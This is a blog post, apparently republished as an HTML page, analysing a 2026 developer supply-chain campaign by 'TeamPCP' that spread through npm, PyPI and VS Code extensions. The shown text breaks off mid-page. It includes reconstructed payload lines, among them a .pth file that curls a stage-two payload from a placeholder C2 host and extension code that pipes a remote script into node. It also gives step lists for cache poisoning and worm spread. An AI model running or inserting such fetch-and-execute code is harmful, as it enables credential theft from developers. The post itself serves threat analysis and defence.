@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https:; media-src 'self' https:; frame-src https:; connect-src 'self';">
+<title>TeamPCP Broke GitHub — And Nobody Saw It Coming (But They Should Have) — FreeRave</title>
+<meta name="description" content="A deep technical breakdown of how TeamPCP / UNC6780 ran a 3-month supply chain campaign...">
+<link rel="canonical" href="https://dev.to/freerave/teampcp-broke-github-and-nobody-saw-it-coming-but-they-should-have-3opg">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dev.to/freerave/teampcp-broke-github-and-nobody-saw-it-coming-but-they-should-have-3opg">
+<meta property="og:title" content="TeamPCP Broke GitHub — And Nobody Saw It Coming (But They Should Have) — FreeRave">
+<meta property="og:description" content="A deep technical breakdown of how TeamPCP / UNC6780 ran a 3-month supply chain campaign...">
+<meta property="og:image" content="https://media2.dev.to/dynamic/image/width=1200,height=627,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fnfqyjbseje5g7w80g3yr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#00e5ff">
+<link rel="icon" type="image/svg+xml" href="/assets/icon.svg">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/blog/blog.css">
+</head>
+<body>
+<nav class="blog-nav">
+  <a href="/" class="blog-brand"><span>Free</span>Rave</a>
+  <a href="/blog/">// blog</a>
+</nav>
+<main class="post">
+  <img class="post-cover" src="https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fnfqyjbseje5g7w80g3yr.png" alt="">
+  <h1 class="post-title">TeamPCP Broke GitHub — And Nobody Saw It Coming (But They Should Have)</h1>
+  <div class="post-meta">
+    <time datetime="2026-05-22T11:23:23Z">22 May 2026</time> · 12 min read
+    <div class="post-tags"><span class="post-tag">#opensource</span><span class="post-tag">#javascript</span><span class="post-tag">#devops</span><span class="post-tag">#security</span></div>
+  </div>
+  <article class="post-body">
+<h2>
+  <a name="a-deep-technical-breakdown-of-how-teampcp-unc6780-ran-a-3month-supply-chain-campaign-ending-in-githubs-own-internal-breach-timeline-attack-anatomy-iocs-and-what-every-developer-needs-to-lock-down-now" href="#a-deep-technical-breakdown-of-how-teampcp-unc6780-ran-a-3month-supply-chain-campaign-ending-in-githubs-own-internal-breach-timeline-attack-anatomy-iocs-and-what-every-developer-needs-to-lock-down-now">
+  </a>
+  A deep technical breakdown of how TeamPCP / UNC6780 ran a 3-month supply chain campaign ending in GitHub's own internal breach. Timeline, attack anatomy, IOCs, and what every developer needs to lock down NOW.
+</h2>
+
+<blockquote>
+<p><strong>TL;DR:</strong> Between March and May 2026, a financially motivated threat group called TeamPCP executed the most sustained developer supply chain campaign in recent history — compromising Trivy, Checkmarx, Bitwarden CLI, axios, TanStack, Mistral AI, OpenAI, and finally GitHub itself. The final vector: a VS Code extension live for <strong>18 minutes</strong>. That was enough.</p>
+</blockquote>
+
+
+<hr>
+
+<h2>
+  <a name="why-im-writing-this" href="#why-im-writing-this">
+  </a>
+  Why I'm Writing This
+</h2>
+
+<p>I've been following the 2026 breach cluster since the ShinyHunters identity-layer pivot. But TeamPCP is a different animal. ShinyHunters went after third-party vendor credentials. TeamPCP went after <strong>you</strong> — your laptop, your VS Code, your npm tokens, your GitHub PAT sitting in <code>~/.gitconfig</code>.</p>
+
+<p>If you write code, you are the attack surface. Full stop.</p>
+
+
+<hr>
+
+<h2>
+  <a name="the-actor-who-is-teampcp-unc6780" href="#the-actor-who-is-teampcp-unc6780">
+  </a>
+  The Actor: Who is TeamPCP / UNC6780?
+</h2>
+
+<div class="table-wrapper-paragraph"><table>
+<thead>
+<tr>
+<th>Alias</th>
+<th>Tracker</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TeamPCP</td>
+<td>Self-identified on BreachForums</td>
+</tr>
+<tr>
+<td>UNC6780</td>
+<td>Google Threat Intelligence Group</td>
+</tr>
+<tr>
+<td>PCPcat</td>
+<td>Infrastructure alias</td>
+</tr>
+<tr>
+<td>DeadCatx3</td>
+<td>Malware signing alias</td>
+</tr>
+<tr>
+<td>ShellForge / CipherForce</td>
+<td>Operational aliases</td>
+</tr>
+</tbody>
+</table></div>
+
+<p><strong>Motivation:</strong> Purely financial. No geopolitical agenda. They steal credentials, sell data, and run extortion. They've also partnered with ransomware group <strong>Vect</strong> — signaling a possible pivot from credential theft toward full-scale extortion operations.</p>
+
+<p><strong>Signature tells:</strong></p>
+
+<ul>
+<li>Payloads skip systems with Russian locale (<code>LANG=ru_RU</code>) — Eastern European cybercrime tradecraft</li>
+<li>RSA public key reuse across campaigns (Wiz's high-confidence attribution signal)</li>
+<li>Shared cipher salt and dead-drop string lineage across malware families</li>
+<li>Prefer <strong>orphan commits</strong> in official repos as payload hosting to evade takedowns</li>
+<li>Use steganography (WAV audio files) and .pth persistence for evasion</li>
+</ul>
+
+
+<hr>
+
+<h2>
+  <a name="the-full-timeline-3-months-of-escalation" href="#the-full-timeline-3-months-of-escalation">
+  </a>
+  The Full Timeline: 3 Months of Escalation
+</h2>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Mar 19 ──── Trivy (aquasecurity) → CanisterWorm ICP C2
+Mar 25 ──── Checkmarx KICS Docker images
+Mar 26 ──── LiteLLM (AI gateway) → .pth persistence
+Mar 27 ──── Telnyx SDK → WAV steganography payload
+Mar 31 ──── axios 1.14.1 / 0.30.0 → cross-platform RAT [100M weekly DL]
+Apr 22 ──── Checkmarx KICS VS Code extension
+Apr 27 ──── @bitwarden/cli 2026.4.0 → self-propagating
+Apr 29-May 1 ─ Mini Shai-Hulud Wave 1: SAP CAP, PyTorch Lightning, intercom-client
+May 11 ──── Mini Shai-Hulud Wave 2: 84 @tanstack/* packages in 6 minutes
+May 12 ──── @mistralai/* npm packages (bug in payload — non-functional)
+May 12 ──── @uipath/* npm packages
+May 13 ──── Shai-Hulud source code published to GitHub under MIT license
+May 13 ──── $1,000 Monero supply chain attack contest on BreachForums
+May 15 ──── OpenAI discloses 2 compromised employee devices (TanStack vector)
+May 19 ──── Microsoft durabletask Python SDK (PyPI) — 28KB payload
+May 18 ──── Nx Console v18.95.0 live on VS Code Marketplace [18 minutes]
+May 19 ──── GitHub detects breach, starts incident response
+May 20 ──── GitHub publicly confirms: ~3,800 internal repos exfiltrated
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+<hr>
+
+<h2>
+  <a name="attack-anatomy-how-each-wave-worked" href="#attack-anatomy-how-each-wave-worked">
+  </a>
+  Attack Anatomy — How Each Wave Worked
+</h2>
+
+<h3>
+  <a name="wave-1-march-trivy-the-credential-rotation-mistake" href="#wave-1-march-trivy-the-credential-rotation-mistake">
+  </a>
+  Wave 1 (March): Trivy — The Credential Rotation Mistake
+</h3>
+
+<p>The campaign started with a mistake by Aqua Security: <strong>incomplete credential rotation</strong> after a prior incident.</p>
+
+<p><strong>CVE-2026-33634</strong> (CVSS v4.0: <strong>9.4</strong>) — Listed in CISA KEV catalog, remediation deadline April 9, 2026.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>1. TeamPCP obtains stale Trivy publish credentials
+2. Force-push malicious commits across 76/77 version tags in aquasecurity/trivy-action
+3. Payload: CanisterWorm — uses ICP (Internet Computer Protocol) canisters as C2
+   → Censorship-resistant command-and-control. Can't be taken down by domain seizure.
+4. Any CI pipeline running Trivy: compromised
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>Why ICP canisters?</strong> Traditional C2 infrastructure can be taken down (domain seizure, IP block). ICP runs on a decentralized blockchain. You can't "block" it. This is a meaningful evolution in C2 design.</p>
+
+
+<hr>
+
+<h3>
+  <a name="wave-2-late-march-litellm-pth-persistence" href="#wave-2-late-march-litellm-pth-persistence">
+  </a>
+  Wave 2 (Late March): LiteLLM — .pth Persistence
+</h3>
+
+<p>LiteLLM is the AI gateway library. It sits between your app and OpenAI/Anthropic/whatever. Extremely high-value target.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight python"><code><span class="c1"># What the malicious .pth file looked like conceptually:
+# /usr/lib/python3.x/site-packages/mal.pth
+</span>
+<span class="kn">import</span> <span class="n">subprocess</span><span class="p">;</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">([</span><span class="sh">'</span><span class="s">curl</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-sS</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https://[C2]/stage2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-o</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/tmp/s2</span><span class="sh">'</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>The .pth persistence trick:</strong><br>
+Any <code>.pth</code> file in Python's <code>site-packages</code> gets <strong>executed on every Python interpreter invocation</strong>. Not on install. Not on import. On every single <code>python</code> call on the system.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Developer installs LiteLLM →
+Malicious postinstall writes .pth file →
+Every subsequent python command = malware execution
+Survives pip uninstall of LiteLLM
+Survives virtualenv recreation
+Only wiped if you manually audit site-packages
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+<hr>
+
+<h3>
+  <a name="wave-3-march-27-telnyx-wav-steganography" href="#wave-3-march-27-telnyx-wav-steganography">
+  </a>
+  Wave 3 (March 27): Telnyx — WAV Steganography
+</h3>
+
+<p>This one is technically elegant and worth understanding.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>1. Malicious Telnyx SDK published
+2. On import, SDK fetches a .WAV audio file from C2
+3. WAV file is decoded: XOR decryption extracts a Windows PE binary
+4. Binary executed in-memory
+5. Second-stage RAT establishes persistence
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p>Why WAV? Because most egress filters and DLP tools don't inspect audio files for executable content. WAV has no signature that screams "malware." It passes through corporate proxies quietly.</p>
+
+
+<hr>
+
+<h3>
+  <a name="wave-4-march-31-axios-100-million-weekly-downloads" href="#wave-4-march-31-axios-100-million-weekly-downloads">
+  </a>
+  Wave 4 (March 31): axios — 100 Million Weekly Downloads
+</h3>
+
+<p>This is the one that should have been a five-alarm fire for the entire JavaScript ecosystem.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Timeline:
+19:41 UTC — axios 1.14.1 published (malicious)
+22:47 UTC — axios 0.30.0 published (malicious)  
+~23:30 UTC — malicious versions removed
+Window: ~3 hours for 1.14.1, ~45 minutes for 0.30.0
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>Payload:</strong> A cross-platform RAT targeting macOS, Windows, and Linux. Not a simple credential stealer — a full Remote Access Trojan.</p>
+
+<p>The scary part: how many <code>npm install</code> runs happened in those 3 hours? How many CI pipelines pulled a fresh install? How many Docker images cached that version?</p>
+
+
+<hr>
+
+<h3>
+  <a name="wave-5-april-27-bitwardencli-the-selfpropagating-twist" href="#wave-5-april-27-bitwardencli-the-selfpropagating-twist">
+  </a>
+  Wave 5 (April 27): @bitwarden/cli — The Self-Propagating Twist
+</h3>
+
+<p>This is where the campaign got genuinely worm-like.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Install malicious @bitwarden/cli →
+Payload executes (credential theft) →
+Payload enumerates ALL npm packages the victim can publish →
+Injects malicious code into EACH of those packages →
+Re-publishes them →
+Every downstream user of victim's packages is now infected
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p>This is not a supply chain attack. This is a <strong>supply chain worm</strong>. One compromised developer with publish access = their entire package portfolio weaponized automatically.</p>
+
+
+<hr>
+
+<h3>
+  <a name="wave-6-may-11-tanstack-github-actions-cache-poisoning" href="#wave-6-may-11-tanstack-github-actions-cache-poisoning">
+  </a>
+  Wave 6 (May 11): TanStack — GitHub Actions Cache Poisoning
+</h3>
+
+<p>This is the most technically sophisticated vector in the campaign. No stolen credentials needed.</p>
+
+<p><strong>Target:</strong> <code>@tanstack/react-router</code> — ~12.7 million weekly downloads.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>The exploit:
+1. Fork the TanStack repository
+2. Open a pull request from the fork
+3. A GitHub Actions workflow triggers on pull_request with write access to base repo's cache
+4. Attacker's code poisons that cache with malicious content
+5. Wait for a legitimate release to use the poisoned cache
+6. Malicious code injected into build artifacts
+7. Release published — clean on the outside, poisoned inside
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>The critical detail:</strong> The workflow had <code>pull_request</code> trigger with cache write permissions. This is a common misconfiguration. The <code>pull_request_target</code> vs <code>pull_request</code> distinction is one of the most dangerous footguns in GitHub Actions.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight yaml"><code><span class="c1"># DANGEROUS — allows fork PRs to write to base repo cache</span>
+<span class="na">on</span><span class="pi">:</span>
+  <span class="na">pull_request</span><span class="pi">:</span>
+
+<span class="na">jobs</span><span class="pi">:</span>
+  <span class="na">build</span><span class="pi">:</span>
+    <span class="na">permissions</span><span class="pi">:</span>
+      <span class="na">actions</span><span class="pi">:</span> <span class="s">write</span>  <span class="c1"># &lt;-- this is the problem</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight yaml"><code><span class="c1"># SAFER</span>
+<span class="na">on</span><span class="pi">:</span>
+  <span class="na">pull_request</span><span class="pi">:</span>
+
+<span class="na">jobs</span><span class="pi">:</span>
+  <span class="na">build</span><span class="pi">:</span>
+    <span class="na">permissions</span><span class="pi">:</span>
+      <span class="na">actions</span><span class="pi">:</span> <span class="s">read</span>  <span class="c1"># read-only</span>
+      <span class="na">contents</span><span class="pi">:</span> <span class="s">read</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>Result:</strong> 84 malicious package versions across 42 <code>@tanstack/*</code> packages published in <strong>under 6 minutes</strong> between 19:20 and 19:26 UTC.</p>
+
+<p><strong>Victims confirmed:</strong></p>
+
+<ul>
+<li>OpenAI: 2 employee devices compromised, internal repos accessed, code-signing certificates rotated</li>
+<li>Mistral AI: 1 developer device, $25,000 extortion demand, claimed 5GB source code</li>
+</ul>
+
+
+<hr>
+
+<h3>
+  <a name="wave-7-may-18-nx-console-the-github-kill-shot" href="#wave-7-may-18-nx-console-the-github-kill-shot">
+  </a>
+  Wave 7 (May 18): Nx Console — The GitHub Kill Shot
+</h3>
+
+<p>Now we get to the main event.</p>
+
+<p><strong>Target:</strong> <code>nrwl.angular-console</code> (Nx Console) — 2.2 million installs, verified publisher status.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Timeline:
+12:30 UTC May 18 — Malicious v18.95.0 published to VS Code Marketplace
+12:36 UTC        — Confirmed live with malicious main.js
+12:48 UTC        — Community detection, version pulled (18 minutes)
+36 min           — Also pulled from OpenVSX
+
+May 19           — GitHub detects breach on employee device
+May 20           — GitHub publicly confirms ~3,800 internal repos exfiltrated
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>The payload mechanism:</strong><br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight javascript"><code><span class="c1">// Simplified reconstruction of what happened in main.js</span>
+<span class="c1">// (based on OX Security / StepSecurity analysis)</span>
+
+<span class="c1">// Normal extension startup...</span>
+<span class="c1">// ...then silently:</span>
+
+<span class="kd">const</span> <span class="p">{</span> <span class="nx">execSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="c1">// Fetch payload from a planted ORPHAN COMMIT in the official nrwl/nx repo</span>
+<span class="c1">// This is genius — the payload is hosted on GitHub itself</span>
+<span class="c1">// The extension publisher can't be blamed, the official repo looks clean</span>
+<span class="c1">// The orphan commit doesn't appear in git log</span>
+
+<span class="kd">const</span> <span class="nx">payloadUrl</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://raw.githubusercontent.com/nrwl/nx/[orphan-sha]/[hidden-path]/payload.js</span><span class="dl">'</span><span class="p">;</span>
+
+<span class="c1">// 498KB obfuscated payload</span>
+<span class="c1">// Executes within SECONDS of opening any workspace</span>
+<span class="nf">execSync</span><span class="p">(</span><span class="s2">`curl -sS </span><span class="p">${</span><span class="nx">payloadUrl</span><span class="p">}</span><span class="s2"> | node`</span><span class="p">,</span> <span class="p">{</span> <span class="na">stdio</span><span class="p">:</span> <span class="dl">'</span><span class="s1">ignore</span><span class="dl">'</span> <span class="p">});</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>What the 498KB payload stole:</strong><br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Targets:
+├── 1Password vaults (CLI / desktop integration)
+├── GitHub tokens (PATs, OAuth, GHES tokens)
+├── npm auth tokens (~/.npmrc)
+├── AWS credentials (~/.aws/credentials)
+├── Anthropic Claude Code configuration
+│   └── API keys, project configs
+└── General credential stores
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>Why "orphan commit" hosting is clever:</strong><br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight shell"><code><span class="c"># An orphan commit has no parent and doesn't appear in any branch</span>
+<span class="c"># It's invisible in normal git log</span>
+<span class="c"># But it's still accessible via its SHA</span>
+
+git fetch origin <span class="o">[</span>sha]
+git show <span class="o">[</span>sha]:[file]
+
+<span class="c"># The nrwl/nx repo looks completely clean to any auditor</span>
+<span class="c"># The payload sits in a dangling object that most scanners miss</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
